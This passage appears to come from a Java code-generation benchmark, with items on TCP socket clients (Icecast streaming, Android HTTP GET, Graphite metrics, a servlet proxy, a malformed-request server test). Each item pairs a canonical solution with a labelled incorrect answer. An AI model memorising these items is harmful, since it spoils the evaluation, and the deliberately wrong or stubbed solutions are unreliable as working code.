    "Canonical_solution": "import io.github.dsheirer.audio.broadcast.BroadcastState;\nimport io.github.dsheirer.audio.broadcast.icecast.IcecastHTTPConfiguration;\nimport org.apache.mina.core.RuntimeIoException;\nimport org.apache.mina.core.buffer.IoBuffer;\nimport org.apache.mina.core.future.ConnectFuture;\nimport org.apache.mina.core.service.IoHandlerAdapter;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.codec.ProtocolDecoderException;\nimport org.apache.mina.http.HttpClientCodec;\nimport org.apache.mina.http.HttpRequestImpl;\nimport org.apache.mina.http.api.DefaultHttpResponse;\nimport org.apache.mina.http.api.HttpMethod;\nimport org.apache.mina.http.api.HttpVersion;\nimport org.apache.mina.transport.socket.nio.NioSocketConnector;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.net.ConnectException;\nimport java.net.InetSocketAddress;\nimport java.util.Map;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class IcecastHTTPAudioBroadcaster {\n\n    private static final Logger mLog = LoggerFactory.getLogger(IcecastHTTPAudioBroadcaster.class);\n    private static final long RECONNECT_INTERVAL_MILLISECONDS = 30000;\n\n    private NioSocketConnector mSocketConnector;\n    private IoSession mStreamingSession = null;\n    private AtomicBoolean mConnecting = new AtomicBoolean();\n    private long mLastConnectionAttempt = 0;\n\n    public IcecastHTTPAudioBroadcaster(IcecastHTTPConfiguration configuration) {\n        // Constructor logic\n    }\n\n    private boolean connect() {\n        if(!connected() && canConnect() &&\n            (mLastConnectionAttempt + RECONNECT_INTERVAL_MILLISECONDS < System.currentTimeMillis()) &&\n            mConnecting.compareAndSet(false, true))\n        {\n            mLastConnectionAttempt = System.currentTimeMillis();\n\n            if(mSocketConnector == null) {\n                mSocketConnector = new NioSocketConnector();\n                mSocketConnector.setConnectTimeoutCheckInterval(10000);\n                mSocketConnector.getFilterChain().addLast(\"codec\", new HttpClientCodec());\n                mSocketConnector.setHandler(new IcecastHTTPIOHandler());\n            }\n\n            mStreamingSession = null;\n\n            try {\n                ConnectFuture future = mSocketConnector.connect(\n                    new InetSocketAddress(getBroadcastConfiguration().getHost(),\n                    getBroadcastConfiguration().getPort()));\n                future.awaitUninterruptibly();\n                mStreamingSession = future.getSession();\n            } catch(RuntimeIoException rie) {\n                Throwable throwableCause = rie.getCause();\n                if(throwableCause instanceof ConnectException) {\n                    setBroadcastState(BroadcastState.NO_SERVER);\n                } else {\n                    setBroadcastState(BroadcastState.DISCONNECTED);\n                    mLog.debug(\"Failed to connect\", rie);\n                }\n                disconnect();\n            }\n            mConnecting.set(false);\n        }\n        return connected();\n    }\n\n    public void disconnect() {\n        if(mStreamingSession != null) {\n            mStreamingSession.closeNow();\n        }\n    }\n\n    public class IcecastHTTPIOHandler extends IoHandlerAdapter {\n        @Override\n        public void sessionOpened(IoSession session) throws Exception {\n            HttpRequestImpl request = new HttpRequestImpl(HttpVersion.HTTP_1_1, HttpMethod.PUT,\n                getConfiguration().getMountPoint(), \"\", getHTTPHeaders());\n            session.write(request);\n        }\n\n        @Override\n        public void sessionClosed(IoSession session) throws Exception {\n            if(!getBroadcastState().isErrorState()) {\n                setBroadcastState(BroadcastState.DISCONNECTED);\n            }\n            mSocketConnector.dispose();\n            mStreamingSession = null;\n            mSocketConnector = null;\n            mConnecting.set(false);\n        }\n\n        @Override\n        public void exceptionCaught(IoSession session, Throwable throwable) throws Exception {\n            if(throwable instanceof ProtocolDecoderException) {\n                setBroadcastState(BroadcastState.DISCONNECTED);\n            } else {\n                mLog.error(\"Broadcast error\", throwable);\n                setBroadcastState(BroadcastState.DISCONNECTED);\n            }\n            disconnect();\n            mConnecting.set(false);\n        }\n\n        @Override\n        public void messageReceived(IoSession session, Object object) throws Exception {\n            if(object instanceof DefaultHttpResponse) {\n                DefaultHttpResponse response = (DefaultHttpResponse) object;\n                switch(response.getStatus()) {\n                    case SUCCESS_OK:\n                        setBroadcastState(BroadcastState.CONNECTED);\n                        mConnecting.set(false);\n                        break;\n                    case CLIENT_ERROR_UNAUTHORIZED:\n                        setBroadcastState(BroadcastState.INVALID_CREDENTIALS);\n                        break;\n                    case CLIENT_ERROR_FORBIDDEN:\n                        setBroadcastState(BroadcastState.CONFIGURATION_ERROR);\n                        break;\n                    default:\n                        if(!getBroadcastState().isErrorState()) {\n                            setBroadcastState(BroadcastState.ERROR);\n                        }\n                        break;\n                }\n                disconnect();\n            }\n        }\n    }\n\n    // Helper methods (stubs for compilation)\n    private boolean connected() { return false; }\n    private boolean canConnect() { return false; }\n    private IcecastHTTPConfiguration getBroadcastConfiguration() { return null; }\n    private void setBroadcastState(BroadcastState state) {}\n    private BroadcastState getBroadcastState() { return null; }\n    private Map<String,String> getHTTPHeaders() { return null; }\n    private IcecastHTTPConfiguration getConfiguration() { return null; }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 10,
    "wrong_result": "```java\nimport org.apache.mina.core.service.IoHandlerAdapter;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.codec.ProtocolCodecFilter;\nimport org.apache.mina.filter.codec.textline.TextLineCodecFactory;\nimport org.apache.mina.transport.socket.nio.NioSocketConnector;\n\nimport java.io.UnsupportedEncodingException;\nimport java.net.InetSocketAddress;\nimport java.nio.charset.StandardCharsets;\nimport java.util.ArrayList;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\nimport org.slf4j.Logger;\n\npublic class IcecastHTTPAudioBroadcaster {\n    private final Logger mLog;\n    private final long RECONNECT_INTERVAL_MILLISECONDS = 30000;\n    private final NioSocketConnector mSocketConnector;\n    private final IcecastHTTPIOHandler mIoHandler;\n    private final AtomicBoolean mConnecting = new AtomicBoolean(false);\n    private final IcecastHTTPConfiguration configuration;\n    private IoSession mStreamingSession;\n    private long mLastConnectionAttempt = 0;\n\n    public enum BroadcastState {\n        DISCONNECTED,\n        CONNECTING,\n        CONNECTED,\n        ERROR\n    }\n\n    public IcecastHTTPAudioBroadcaster(IcecastHTTPConfiguration configuration) {\n        this.configuration = configuration;\n        mLog = configuration.getLogger();\n        mSocketConnector = new NioSocketConnector();\n        mSocketConnector.getFilterChain().addLast(\"codec\", new ProtocolCodecFilter(new TextLineCodecFactory(StandardCharsets.ISO_8859_1)));\n        mIoHandler = new IcecastHTTPIOHandler();\n        mSocketConnector.setHandler(mIoHandler);\n    }\n\n    public boolean connect() {\n        if (!canConnect()) {\n            return false;\n        }\n        mConnecting.set(true);\n        mLastConnectionAttempt = System.currentTimeMillis();\n        mLog.info(\"Attempting to connect to Icecast server at {}\", configuration.getHost());\n\n        try {\n            mStreamingSession = mSocketConnector.connect(new InetSocketAddress(configuration.getHost(), configuration.getPort())).getSession();\n            return true;\n        } catch (Exception e) {\n            mLog.error(\"Failed to connect to Icecast server: {}\", e.getMessage());\n            disconnect();\n            return false;\n        }\n    }\n\n    public void disconnect() {\n        if (mStreamingSession != null && mStreamingSession.isConnected()) {\n            mStreamingSession.closeNow();\n            mStreamingSession = null;\n        }\n        mConnecting.set(false);\n        setBroadcastState(BroadcastState.DISCONNECTED);\n    }\n\n    public boolean connected() {\n        return mStreamingSession != null && mStreamingSession.isConnected();\n    }\n\n    public boolean canConnect() {\n        if (mConnecting.get()) {\n            return false;\n        }\n        long timeSinceLastAttempt = System.currentTimeMillis() - mLastConnectionAttempt;\n        return timeSinceLastAttempt >= RECONNECT_INTERVAL_MILLISECONDS;\n    }\n\n    public IcecastHTTPConfiguration getBroadcastConfiguration() {\n        return configuration;\n    }\n\n    public void setBroadcastState(BroadcastState state) {\n        // Implement logic for broadcast state management\n    }\n\n    public BroadcastState getBroadcastState() {\n        if (connected()) {\n            return BroadcastState.CONNECTED;\n        } else if (mConnecting.get()) {\n            return BroadcastState.CONNECTING;\n        } else {\n            return BroadcastState.DISCONNECTED;\n        }\n    }\n\n    public Map<String, String> getHTTPHeaders() throws UnsupportedEncodingException {\n        Map<String, String> headers = new HashMap<>();\n        headers.put(\"User-Agent\", \"MINA-Icecast-Broadcaster/1.0\");\n        headers.put(\"Host\", configuration.getHost() + \":\" + configuration.getPort());\n        headers.put(\"Content-Type\", \"audio/mpeg\");\n        headers.put(\"Ice-Name\", configuration.getStreamName());\n        headers.put(\"Ice-Genre\", configuration.getStreamGenre());\n        headers.put(\"Ice-Public\", \"1\");\n        headers.put(\"Ice-Audio-info\", \"bitrate=\" + configuration.getBitrate() + \"; samplerate=\" + configuration.getSampleRate() + \"; channels=2\");\n\n        String auth = configuration.getUsername() + \":\" + configuration.getPassword();\n        String encodedAuth = java.util.Base64.getEncoder().encodeToString(auth.getBytes(StandardCharsets.ISO_8859_1));\n        headers.put(\"Authorization\", \"Basic \" + encodedAuth);\n\n        return headers;\n    }\n\n    public IcecastHTTPConfiguration getConfiguration() {\n        return configuration;\n    }\n\n    private class IcecastHTTPIOHandler extends IoHandlerAdapter {\n        @Override\n        public void sessionOpened(IoSession session) {\n            mLog.info(\"Session opened with Icecast server.\");\n            mStreamingSession = session;\n            setBroadcastState(BroadcastState.CONNECTED);\n\n            try {\n                StringBuilder requestBuilder = new StringBuilder();\n                requestBuilder.append(\"PUT /\").append(configuration.getMountPoint()).append(\" HTTP/1.0\\r\\n\");\n                for (Map.Entry<String, String> entry : getHTTPHeaders().entrySet()) {\n                    requestBuilder.append(entry.getKey()).append(\": \").append(entry.getValue()).append(\"\\r\\n\");\n                }\n                requestBuilder.append(\"\\r\\n\");\n                byte[] requestBytes = requestBuilder.toString().getBytes(StandardCharsets.ISO_8859_1);\n                session.write(requestBytes);\n            } catch (Exception e) {\n                mLog.error(\"Error sending HTTP request: {}\", e.getMessage());\n                exceptionCaught(session, e);\n            }\n        }\n\n        @Override\n        public void sessionClosed(IoSession session) {\n            mLog.info(\"Session closed with Icecast server.\");\n            mStreamingSession = null;\n            setBroadcastState(BroadcastState.DISCONNECTED);\n            scheduleReconnect();\n        }\n\n        @Override\n        public void exceptionCaught(IoSession session, Throwable throwable) {\n            mLog.error(\"Exception caught during connection: {}\", throwable.getMessage());\n            session.closeNow();\n            setBroadcastState(BroadcastState.ERROR);\n            scheduleReconnect();\n        }\n\n        @Override\n        public void messageReceived(IoSession session, Object object) {\n            if (object instanceof byte[]) {\n                byte[] data = (byte[]) object;\n                String response = new String(data, StandardCharsets.ISO_8859_1);\n                mLog.info(\"Received from Icecast server:\\n{}\", response);\n            }\n        }\n\n        private void scheduleReconnect() {\n            new Thread(() -> {\n                try {\n                    Thread.sleep(RECONNECT_INTERVAL_MILLISECONDS);\n                    if (!connected()) {\n                        mLog.info(\"Attempting to reconnect to Icecast server...\");\n                        connect();\n                    }\n                } catch (InterruptedException e) {\n                    Thread.currentThread().interrupt();\n                }\n            }).start();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 402,
    "Instruction": "Task Description: Create an asynchronous task in Android that performs an HTTP GET request to a specified server using TCP socket communication, reads the response, and returns it to the caller via a callback mechanism.\n\nClass Description: HttpGetTask is an AsyncTask subclass that handles network operations in the background to prevent blocking the UI thread. It establishes a TCP connection to a server, sends an HTTP GET request, reads the response, and delivers it to a retained fragment through a weak reference.\n\nAttributes:\n- TAG: [String] - A constant for logging purposes\n- HOST: [String] - The hostname of the server to connect to\n- USER_NAME: [String] - The username for authentication\n- HTTP_GET_COMMAND: [String] - The formatted HTTP GET request string\n- mListener: [WeakReference<RetainedFragment>] - Weak reference to the fragment that will receive the result\n\nMethods:\n- HttpGetTask([RetainedFragment retainedFragment]) -> [void] - Constructor that initializes the task with a weak reference to the calling fragment\n- doInBackground([Void... params]) -> [String] - Performs the network operations in the background (opens socket, sends request, reads response)\n- onPostExecute([String result]) -> [void] - Delivers the result to the retained fragment after task completion\n- readStream([InputStream in]) -> [String] - Helper method that reads data from an input stream and returns it as a string",
    "Canonical_solution": "import android.os.AsyncTask;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.io.PrintWriter;\nimport java.lang.ref.WeakReference;\nimport java.net.Socket;\n\npublic class HttpGetTask extends AsyncTask<Void, Void, String> {\n\n    private static final String TAG = \"HttpGetTask\";\n    private static final String HOST = \"api.geonames.org\";\n    private static final String USER_NAME = \"aporter\";\n    private static final String HTTP_GET_COMMAND = \"GET /earthquakesJSON?north=44.1&south=-9.9&east=-22.4&west=55.2&username=\"\n            + USER_NAME + \" HTTP/1.1\" + \"\\n\" + \"Host: \" + HOST + \"\\n\"\n            + \"Connection: close\" + \"\\n\\n\";\n\n    private final WeakReference<RetainedFragment> mListener;\n\n    public HttpGetTask(RetainedFragment retainedFragment) {\n        mListener = new WeakReference<>(retainedFragment);\n    }\n\n    @Override\n    protected String doInBackground(Void... params) {\n        Socket socket = null;\n        String data = \"\";\n\n        try {\n            socket = new Socket(HOST, 80);\n            PrintWriter pw = new PrintWriter(new OutputStreamWriter(\n                    socket.getOutputStream()), true);\n            pw.println(HTTP_GET_COMMAND);\n\n            data = readStream(socket.getInputStream());\n\n        } catch (IOException exception) {\n            exception.printStackTrace();\n        } finally {\n            if (null != socket)\n                try {\n                    socket.close();\n                } catch (IOException e) {\n                    Log.e(TAG, \"IOException\");\n                }\n        }\n        return data;\n    }\n\n    @Override\n    protected void onPostExecute(String result) {\n        if (null != mListener.get()) {\n            mListener.get().onDownloadFinished(result);\n        }\n    }\n\n    private String readStream(InputStream in) {\n        BufferedReader reader = null;\n        StringBuilder data = new StringBuilder();\n        try {\n            reader = new BufferedReader(new InputStreamReader(in));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                data.append(line);\n            }\n        } catch (IOException e) {\n            Log.e(TAG, \"IOException\");\n        } finally {\n            if (reader != null) {\n                try {\n                    reader.close();\n                } catch (IOException e) {\n                    Log.e(TAG, \"IOException\");\n                }\n            }\n        }\n        return data.toString();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "```java\npublic class HttpGetTask extends AsyncTask<Void, Void, String> {\n    private static final String TAG = \"HttpGetTask\";\n    private static final String HOST = \"example.com\";\n    private static final String USER_NAME = \"user\";\n    private static final String HTTP_GET_COMMAND = \"GET / HTTP/1.1\\r\\nHost: \" + HOST + \"\\r\\nConnection: close\\r\\n\\r\\n\";\n\n    private WeakReference<RetainedFragment> mListener;\n\n    public HttpGetTask(RetainedFragment retainedFragment) {\n        mListener = new WeakReference<>(retainedFragment);\n    }\n\n    @Override\n    protected String doInBackground(Void... params) {\n        String result = \"\";\n        try (Socket socket = new Socket(HOST, 80)) {\n            OutputStream out = socket.getOutputStream();\n            out.write(HTTP_GET_COMMAND.getBytes());\n            out.flush();\n\n            InputStream in = socket.getInputStream();\n            result = readStream(in);\n        } catch (IOException e) {\n            Log.e(TAG, \"Error during HTTP GET request\", e);\n        }\n        return result;\n    }\n\n    @Override\n    protected void onPostExecute(String result) {\n        RetainedFragment fragment = mListener.get();\n        if (fragment != null && !isCancelled()) {\n            fragment.onHttpResult(result);\n        }\n    }\n\n    private String readStream(InputStream in) throws IOException {\n        StringBuilder sb = new StringBuilder();\n        BufferedReader reader = new BufferedReader(new InputStreamReader(in));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            sb.append(line).append(\"\\n\");\n        }\n        return sb.toString();\n    }\n}\n```"
  },
  {
    "Task_id": 403,
    "Instruction": "Task Description: Create a function that sends a string to a server using TCP socket communication.\n\nFunction Description: The function establishes a TCP connection to a specified server and port, sends a string message, then closes the connection. It handles potential IO exceptions by printing formatted error information.\n\nInput: \n- str: String - The message to be sent to the server\n\nOutput: None (The function has no return value but may print error information to stderr if the operation fails)",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.Socket;\nimport java.util.Arrays;\n\npublic static void socketSend(String str) {\n    try {\n        Socket socket = new Socket(\"127.0.0.1\", 5327);\n        OutputStream out = socket.getOutputStream();\n        out.write(str.getBytes());\n        out.close();\n    } catch (IOException e) {\n        System.err.println(e.toString()+\"\\n\"+ Arrays.toString(e.getStackTrace())\n                .replace(\"[\",\"   at \")\n                .replace(\",\",\"\\n   at\")\n                .replace(\"]\",\"\"));\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 15,
    "wrong_result": "```java\nimport java.io.OutputStream;\nimport java.io.IOException;\nimport java.net.Socket;\n\npublic class TcpClient {\n    public void sendStringToServer(String str, String serverAddress, int port) {\n        try (Socket socket = new Socket(serverAddress, port);\n             OutputStream outputStream = socket.getOutputStream()) {\n            outputStream.write(str.getBytes());\n            outputStream.flush();\n        } catch (IOException e) {\n            System.err.println(\"Error: \" + e.getMessage());\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 404,
    "Instruction": "Task Description: Create a TCP client class in Java that can establish a connection to a server, send requests, and receive responses.\n\nClass Description: The TcpClient class provides functionality to connect to a TCP server, send string requests, and receive string responses. It handles socket creation, data transmission, and resource cleanup.\n\nAttributes:\n- host: String - The hostname or IP address of the server to connect to\n- port: int - The port number on which the server is listening\n- TAG: String - A constant for logging purposes (default value: \"HttpGet\")\n\nMethods:\n- TcpClient(String host, int port) -> None - Constructor that initializes the host and port attributes\n- sendRequest(String request) -> String - Sends the request string to the server and returns the response\n- readStream(InputStream in) -> String - Helper method that reads data from an input stream and returns it as a string",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.io.PrintWriter;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TcpClient {\n\n    private static final String TAG = \"HttpGet\";\n    private String host;\n    private int port;\n\n    public TcpClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public String sendRequest(String request) {\n        Socket socket = null;\n        String data = \"\";\n\n        try {\n            socket = new Socket(host, port);\n            PrintWriter pw = new PrintWriter(new OutputStreamWriter(\n                    socket.getOutputStream()), true);\n            pw.println(request);\n\n            data = readStream(socket.getInputStream());\n\n        } catch (UnknownHostException exception) {\n            exception.printStackTrace();\n        } catch (IOException exception) {\n            exception.printStackTrace();\n        } finally {\n            if (null != socket)\n                try {\n                    socket.close();\n                } catch (IOException e) {\n                    Log.e(TAG, \"IOException\");\n                }\n        }\n        return data;\n    }\n\n    private String readStream(InputStream in) {\n        BufferedReader reader = null;\n        StringBuffer data = new StringBuffer();\n        try {\n            reader = new BufferedReader(new InputStreamReader(in));\n            String line = \"\";\n            while ((line = reader.readLine()) != null) {\n                data.append(line);\n            }\n        } catch (IOException e) {\n            Log.e(TAG, \"IOException\");\n        } finally {\n            if (reader != null) {\n                try {\n                    reader.close();\n                } catch (IOException e) {\n                    Log.e(TAG, \"IOException\");\n                }\n            }\n        }\n        return data.toString();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class TcpClient {\n    private String host;\n    private int port;\n    public static final String TAG = \"HttpGet\";\n\n    public TcpClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public String sendRequest(String request) throws IOException {\n        try (Socket socket = new Socket(host, port);\n             PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n             BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()))) {\n\n            out.println(request);\n            return readStream(in);\n        }\n    }\n\n    private String readStream(BufferedReader reader) throws IOException {\n        StringBuilder response = new StringBuilder();\n        String line;\n        while ((line = reader.readLine()) != null) {\n            response.append(line).append(\"\\n\");\n        }\n        return response.toString();\n    }\n}\n```"
  },
  {
    "Task_id": 405,
    "Instruction": "Task Description: Create a Java class that implements a TCP client for pushing metrics to a Graphite server, with support for periodic pushing and character sanitization for Graphite compatibility.\n\nClass Description: The Graphite class provides functionality to connect to a Graphite server via TCP and push metrics from a CollectorRegistry. It handles character sanitization for Graphite compatibility and supports both one-time pushes and periodic pushing via a daemon thread.\n\nAttributes:\n- host: String - The hostname or IP address of the Graphite server\n- port: int - The port number of the Graphite server\n- logger: Logger - Logger instance for error logging\n- INVALID_GRAPHITE_CHARS: Pattern - Regular expression pattern for invalid Graphite characters\n\nMethods:\n- Graphite(String host, int port) -> None - Constructor that initializes the Graphite client with server connection details\n- push(CollectorRegistry registry) -> void - Pushes all metrics from the registry to Graphite server immediately. Throws IOException if connection fails\n- start(CollectorRegistry registry) -> Thread - Starts a daemon thread that pushes metrics every 60 seconds\n- start(CollectorRegistry registry, int intervalSeconds) -> Thread - Starts a daemon thread that pushes metrics at specified intervals\n- PushThread(CollectorRegistry registry, int intervalSeconds) -> None - Inner class constructor for the periodic push thread\n- run() -> void - The main execution method of PushThread that handles periodic metric pushing",
    "Canonical_solution": "import io.prometheus.client.Collector;\nimport io.prometheus.client.CollectorRegistry;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.OutputStreamWriter;\nimport java.io.PrintWriter;\nimport java.net.Socket;\nimport java.nio.charset.Charset;\nimport java.util.Collections;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\nimport java.util.regex.Pattern;\nimport java.util.regex.Matcher;\n\npublic class Graphite {\n  private static final Logger logger = Logger.getLogger(Graphite.class.getName());\n  private final String host;\n  private final int port;\n  private static final Pattern INVALID_GRAPHITE_CHARS = Pattern.compile(\"[^a-zA-Z0-9_-]\");\n\n  public Graphite(String host, int port) {\n    this.host = host;\n    this.port = port;\n  }\n\n  public void push(CollectorRegistry registry) throws IOException {\n    Socket s = new Socket(host, port);\n    BufferedWriter writer = new BufferedWriter(new PrintWriter(new OutputStreamWriter(s.getOutputStream(), Charset.forName(\"UTF-8\")));\n    Matcher m = INVALID_GRAPHITE_CHARS.matcher(\"\");\n    long now = System.currentTimeMillis() / 1000;\n    for (Collector.MetricFamilySamples metricFamilySamples: Collections.list(registry.metricFamilySamples())) {\n      for (Collector.MetricFamilySamples.Sample sample: metricFamilySamples.samples) {\n        m.reset(sample.name);\n        writer.write(m.replaceAll(\"_\"));\n        for (int i = 0; i < sample.labelNames.size(); ++i) {\n          m.reset(sample.labelValues.get(i));\n          writer.write(\";\" + sample.labelNames.get(i) + \"=\" + m.replaceAll(\"_\"));\n        }\n        writer.write(\" \" + sample.value + \" \" + now + \"\\n\");\n      }\n    }\n    writer.close();\n    s.close();\n  }\n\n  public Thread start(CollectorRegistry registry) {\n    return start(registry, 60);\n  }\n\n  public Thread start(CollectorRegistry registry, int intervalSeconds) {\n    Thread thread = new PushThread(registry, intervalSeconds);\n    thread.setDaemon(true);\n    thread.start();\n    return thread;\n  }\n\n  private class PushThread extends Thread {\n    private final CollectorRegistry registry;\n    private final int intervalSeconds;\n\n    PushThread(CollectorRegistry registry, int intervalSeconds) {\n      this.registry = registry;\n      this.intervalSeconds = intervalSeconds;\n    }\n\n    public void run() {\n      long waitUntil = System.currentTimeMillis();\n      while (true) {\n        try {\n          push(registry);\n        } catch (IOException e) {\n          logger.log(Level.WARNING, \"Exception \" + e + \" pushing to \" + host + \":\" + port, e);\n        }\n\n        long now = System.currentTimeMillis();\n        while (now >= waitUntil) {\n          waitUntil += intervalSeconds * 1000;\n        }\n        try {\n          Thread.sleep(waitUntil - now);\n        } catch (InterruptedException e) {\n          return;\n        }\n      }\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.logging.*;\nimport java.util.regex.Pattern;\nimport io.prometheus.client.CollectorRegistry;\n\npublic class Graphite {\n    private final String host;\n    private final int port;\n    private static final Logger logger = Logger.getLogger(Graphite.class.getName());\n    private static final Pattern INVALID_GRAPHITE_CHARS = Pattern.compile(\"[^a-zA-Z0-9_\\\\.:]\");\n\n    public Graphite(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void push(CollectorRegistry registry) throws IOException {\n        try (Socket socket = new Socket(host, port);\n             OutputStream out = socket.getOutputStream();\n             PrintWriter writer = new PrintWriter(out)) {\n            registry.metricFamilySamples().forEach(family -> {\n                family.samples.forEach(sample -> {\n                    String name = sanitizeMetricName(family.name + \".\" + sample.name);\n                    String value = String.valueOf(sample.value);\n                    String timestamp = String.valueOf(System.currentTimeMillis() / 1000L);\n                    writer.println(name + \" \" + value + \" \" + timestamp);\n                });\n            });\n            writer.flush();\n        } catch (IOException e) {\n            logger.log(Level.SEVERE, \"Failed to connect to Graphite server\", e);\n            throw e;\n        }\n    }\n\n    public Thread start(CollectorRegistry registry) {\n        return start(registry, 60);\n    }\n\n    public Thread start(CollectorRegistry registry, int intervalSeconds) {\n        Thread thread = new PushThread(registry, intervalSeconds);\n        thread.setDaemon(true);\n        thread.start();\n        return thread;\n    }\n\n    private class PushThread extends Thread {\n        private final CollectorRegistry registry;\n        private final int intervalSeconds;\n\n        public PushThread(CollectorRegistry registry, int intervalSeconds) {\n            this.registry = registry;\n            this.intervalSeconds = intervalSeconds;\n        }\n\n        @Override\n        public void run() {\n            while (!Thread.interrupted()) {\n                try {\n                    push(registry);\n                    Thread.sleep(intervalSeconds * 1000L);\n                } catch (InterruptedException e) {\n                    Thread.currentThread().interrupt();\n                    break;\n                } catch (IOException e) {\n                    logger.log(Level.SEVERE, \"Error pushing metrics to Graphite\", e);\n                }\n            }\n        }\n    }\n\n    private String sanitizeMetricName(String name) {\n        return INVALID_GRAPHITE_CHARS.matcher(name).replaceAll(\"_\");\n    }\n}\n```"
  },
  {
    "Task_id": 406,
    "Instruction": "Task Description: Write a Java function that tests a server's handling of a malformed HTTP request by sending a bad request and verifying the server's response.\n\nFunction Description: The function `testBadRequest` attempts to send a deliberately malformed HTTP POST request to a server and verifies that the server responds with a \"400 Bad Request\" error. The function creates a TCP socket connection to the server, sends the malformed request, reads the server's response, and compares it to the expected response. If the response matches, the test passes; otherwise, it may throw an IOException if the connection is closed prematurely.\n\nInput: None (The server address and port are obtained from `DefaultServer.getDefaultServerAddress()` internally)\n\nOutput: None (The function asserts the server's response matches the expected \"400 Bad Request\" response. Any mismatch or IOException will result in a test failure or exception.)",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.Socket;\n\npublic void testBadRequest() throws IOException {\n    String request = \"POST /\\r HTTP/1.1\\r\\nTrailer:foo, bar\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n9\\r\\nabcdefghi\\r\\n0\\r\\nfoo: fooVal\\r\\n bar: barVal\\r\\n\\r\\n\";\n    String response1 = \"HTTP/1.1 400 Bad Request\\r\\nContent-Length: 0\\r\\nConnection: close\\r\\n\\r\\n\";\n    Socket s = new Socket(DefaultServer.getDefaultServerAddress().getAddress(), DefaultServer.getDefaultServerAddress().getPort());\n    try {\n        s.getOutputStream().write(request.getBytes());\n\n        StringBuilder sb = new StringBuilder();\n        int read = 0;\n        byte[] buf = new byte[100];\n        while (read < response1.length()) {\n            int r = s.getInputStream().read(buf);\n            if (r <= 0) break;\n            if (r > 0) {\n                read += r;\n                sb.append(new String(buf, 0, r));\n            }\n        }\n        Assert.assertEquals(response1, sb.toString());\n\n    } catch (IOException expected) {\n        //this can happen as well, as in some cases we may not have fully consumed the read side\n        //before the connection is shutdown, namely when we are running in test.single\n    } finally {\n        s.close();\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 15,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class BadRequestTester {\n    public void testBadRequest() throws IOException {\n        String serverAddress = DefaultServer.getDefaultServerAddress();\n        int port = DefaultServer.getDefaultServerPort();\n\n        try (Socket socket = new Socket(serverAddress, port);\n             PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n             BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()))) {\n\n            // Send a malformed HTTP POST request\n            String malformedRequest = \"POST / HTTP/1.1\\r\\n\" +\n                                      \"Host: badhost\\r\\n\" +\n                                      \"Content-Length: 5\\r\\n\" +\n                                      \"\\r\\n\" +\n                                      \"data\";\n\n            out.print(malformedRequest);\n\n            // Read the first line of the response\n            String responseLine = in.readLine();\n            if (responseLine == null || !responseLine.contains(\"400 Bad Request\")) {\n                throw new IOException(\"Unexpected response: \" + responseLine);\n            }\n        } catch (IOException e) {\n            throw new IOException(\"Test failed due to connection issue or unexpected server behavior\", e);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 407,
    "Instruction": "Task Description: Create a Java class that acts as a TCP client within a servlet context, handling HTTP requests by forwarding them to a specified server via TCP and returning the server's response.\n\nClass Description: The Lisplet class extends HttpServlet to handle HTTP POST requests. It establishes a TCP connection to a specified host and port, sends the HTTP request data in a custom format, processes the server's response, and returns it to the client.\n\nAttributes:\n- host: String - The hostname or IP address of the TCP server to connect to\n- port: int - The port number of the TCP server to connect to\n\nMethods:\n- doPost(HttpServletRequest req, HttpServletResponse resp) -> void - Handles HTTP POST requests by establishing a TCP connection, sending the request, processing the response, and closing the connection\n- transferResponseBody(HttpServletResponse resp, PushbackInputStream strm) -> void - Transfers the response body from the server to the HTTP response output stream\n- getResponseHeader(HttpServletRequest req, HttpServletResponse resp, PushbackInputStream strm) -> boolean - Reads and processes the response header from the server\n- sendRequest(HttpServletRequest req, Writer writer) -> void - Formats and sends the HTTP request data to the server\n- writeTagValuePair(Writer writer, String tag, String value) -> void - Helper method to write tag-value pairs in the custom request format",
